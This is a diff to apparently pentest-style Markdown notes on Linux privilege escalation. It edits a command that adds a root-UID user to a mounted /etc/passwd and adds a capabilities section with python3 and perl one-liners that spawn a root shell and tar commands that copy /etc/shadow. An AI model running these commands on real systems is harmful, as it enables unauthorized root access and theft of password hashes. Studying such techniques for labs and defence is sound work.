@@ -121,6 +121,35 @@
 
 - Creating a new user can help us escalate privileges,on your system,do `openssl passwd {choice of password}` and in your target machine do this
 
-      echo '[usernameyou want]:[openssl generated hash]:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd` 
-  
-- You have successfully created a user on the attack machine,after that you can ssh to the user or use `su user` 
+      echo '[usernameyou want]:[openssl generated hash]:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd`
+
+### Privesc with capabilities
+  Capabilities work by breaking the actions normally reserved for root down into smaller portions. The use of capabilities is only beginning to drop into userland applications as most system utilities do not shed their root privileges. Let’s move ahead that how we can use this permission more into our task.
+
+Limited user’s permission: As we know Giving away too many privileges by default will result in unauthorized changes of data, backdoors and circumventing access controls, just to name a few. So to overcome this situation we can simply use the capability to limited user’s permission.
+
+Using a fine-grained set of privileges: Use of capability can be more clearly understood by another example. Suppose a web server normally runs at port 80 and we also know that we need root permissions to start listening on one of the lower ports (<1024). This web server daemon needs to be able to listen to port 80. Instead of giving this daemon all root permissions, we can set a capability on the related binary, like CAP_NET_BIND_SERVICE. With this specific capability, it can open up port 80 in a much easier way.
+
+  - To enable a binary'scapabilities, use
+
+        setcap cap_setuid+ep /home/demo/python3
+  - To find binaries with capabilities,use to check the whole system recursively
+
+        getcap -r / 2</dev/null
+  ###IF CAP_SETUID is active
+  - Python binary ,use
+
+        ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+        
+  - Perl binary
+    
+        ./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+  - Tar binary
+    If CAP_DAC_READ_SEARCH is active,we can bypass restrictions and read files and access directories e.g we can read the /etc/shadow file
+
+          ./tar cvf shadow.tar /etc/shadow  
+          ls
+          ./tar -xvf shadow.tar
+        
+          
+            
